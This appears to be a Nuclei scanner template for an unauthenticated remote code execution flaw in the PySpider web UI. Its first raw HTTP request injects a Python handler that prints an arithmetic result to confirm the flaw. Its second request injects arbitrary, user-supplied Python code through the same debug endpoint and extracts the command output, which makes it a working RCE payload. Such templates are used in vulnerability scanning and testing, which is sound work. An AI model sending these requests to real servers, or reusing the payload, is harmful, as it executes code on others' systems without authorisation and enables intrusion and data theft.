id: pyspider-unauthorized-access-rce

info:
  name: PySpider Unauthorized Access RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    PySpider Unauthorized Access allows remote attackers to execute arbitrary Python code.
  reference:
    - https://github.com/ianxtianxt/Pyspider-webui-poc

variables:
  rand1: '{{rand_int(80000000, 88000000)}}'
  rand2: '{{rand_int(80000000, 88000000)}}'
  expression: '{{to_string(rand1)}}+{{to_string(rand2)}}'
  result: '{{to_number(rand1)+to_number(rand2)}}'

http:
  - raw:
      - |
        POST /debug/pyspidervulntest/run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str({{expression}}))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{to_string(result)}}"

  - raw:
      - |
        POST /debug/pyspidervulntest/run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++{{pythonCode}}&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
    extractors:
      - type: regex
        name: execution_output
        part: body
        regex:
          - '"logs": (".*?"), "messages"'
        group: 1
